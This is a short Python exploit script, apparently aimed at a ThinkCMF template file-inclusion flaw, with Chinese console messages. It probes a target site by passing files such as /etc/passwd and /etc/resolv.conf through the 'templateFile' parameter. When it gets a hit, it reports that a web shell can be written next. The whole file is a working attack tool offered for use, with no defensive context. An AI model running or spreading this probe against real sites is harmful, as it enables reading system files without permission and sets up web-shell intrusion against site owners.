import requests
import sys
import re

banner = r"""
  _______ _     _       _     _____ __  __ ______ 
 |__   __| |   (_)     | |   / ____|  \/  |  ____|
    | |  | |__  _ _ __ | | _| |    | \  / | |__   
    | |  | '_ \| | '_ \| |/ / |    | |\/| |  __|  
    | |  | | | | | | | |   <| |____| |  | | |     
    |_|  |_| |_|_|_| |_|_|\_\\_____|_|  |_|_|     

"""

try:
	url = sys.argv[1]
	print(banner)
	if url.find("http://")>=0 or url.find("https://")>=0:
		pass
	else:
		url = "http://"+url+"/"
	print("[*] 正在对{}进行漏洞检测".format(url))
	response = requests.get(url)
	if response.status_code != 200:
		print("[-] 目标url无法访问，请确认连通性")
	else:
		files = ['README.md','Nginx.conf','LICENSE.txt','CONTRIBUTING.md','config.yaml','.htaccess','/etc/passwd','/etc/resolv.conf']
		flag = 0
		for item in files:
			payload = "{0}?a=display&templateFile={1}".format(url,item)
			response = requests.get(payload)
			if response.status_code == 404:
				print("[-] {}不存在".format(item))
			elif response.status_code == 200:
				print("[+] {}存在！，可以进一步写入shell".format(item))
				flag += 1
				break
except IndexError:
	print(banner)
	print("使用方法：python ThinkCMF.py 目标url")